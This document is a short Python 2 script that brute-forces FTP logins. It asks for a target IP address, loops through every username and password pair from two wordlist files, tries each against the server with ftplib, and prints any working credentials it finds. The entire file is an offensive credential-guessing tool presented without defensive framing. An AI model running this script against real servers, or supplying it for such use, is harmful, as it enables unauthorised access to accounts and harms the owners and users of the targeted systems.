import sys
import ftplib
import os


def brute(ip,users_file,passw_file):
    flag = 0
    n = 1
    print "[]"
    try:
        ud = open(users_file,'r')
        up = open(passw_file,'r')

        users = ud.readlines()
        passwds = up.readlines()

        for user in users:
            for passwd in passwds:
                n += 1
                try:
                    os.system("clear")
                    print "[","#"*n ,"]"
                    conect = ftplib.FTP(ip)
                    ans = conect.login(user.strip(),passwd.strip())
                    os.system("clear")
                    print "[+] Login found!"
                    print user.strip('\n') , ":" , passwd
                    flag = 1
                    exit()
                except ftplib.error_perm:
                    #print "[-] Failed attempt"
                    conect.close()
        if flag == 0:
            os.system("clear")
            print "[-] Could not brute with those dicctionaries"

    except(KeyboardInterrupt):
        print "bye."
        sys.exit()

def main():
    ip = raw_input("[>] IP: ")
    users_file = "users.txt" # raw_input("[>] Users file : ")
    passw_file = "passwords.txt" #raw_input("[>] Passwords file : ")

    brute(ip,users_file,passw_file)


main()
